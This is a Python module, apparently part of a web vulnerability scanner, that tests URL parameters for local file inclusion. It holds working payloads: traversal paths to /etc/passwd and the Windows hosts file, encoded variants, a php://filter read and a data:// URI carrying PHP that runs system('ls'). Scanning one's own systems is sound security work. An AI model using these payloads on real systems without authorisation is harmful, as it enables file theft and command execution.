import httpx
import logging
from urllib.parse import urlencode, parse_qs, urlparse

class Module:
    def __init__(self, url, payload_engine, analyzer, verbose=False):
        self.url = url
        self.payload_engine = payload_engine
        self.analyzer = analyzer
        self.verbose = verbose
        self.findings = []

    async def run(self):
        # Test for LFI in URL parameters
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        for param in params:
            await self.test_parameter(param, params[param][0])
        return self.findings

    async def test_parameter(self, param, original_value):
        # Test LFI payloads
        lfi_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '..%252F..%252F..%252Fetc%252Fpasswd',
            '/etc/passwd',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            'file:///etc/passwd',
            'php://filter/convert.base64-encode/resource=/etc/passwd',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOz8+'
        ]
        
        for payload in lfi_payloads:
            if await self.test_lfi(param, payload):
                self.findings.append({
                    'type': 'Local File Inclusion',
                    'url': self.url,
                    'parameter': param,
                    'payload': payload,
                    'risk': 'high',
                    'cwe': 'CWE-98',
                    'description': f'LFI in parameter {param}'
                })

    async def test_lfi(self, param, payload):
        # Test for LFI
        test_url = self.url.replace(f'{param}={parse_qs(urlparse(self.url).query)[param][0]}', f'{param}={payload}')
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                resp = await client.get(test_url)
                # Check for file inclusion indicators
                indicators = [
                    'root:x:',  # /etc/passwd
                    'localhost',  # /etc/hosts
                    '127.0.0.1',  # /etc/hosts
                    '<?php',  # PHP files
                    '<?=',  # PHP short tags
                    '<?',  # PHP tags
                    'bin:',  # Unix paths
                    'usr:',  # Unix paths
                    'etc:',  # Unix paths
                    'windows',  # Windows paths
                    'system32'  # Windows paths
                ]
                for indicator in indicators:
                    if indicator in resp.text:
                        return True
        except Exception:
            pass
        return False 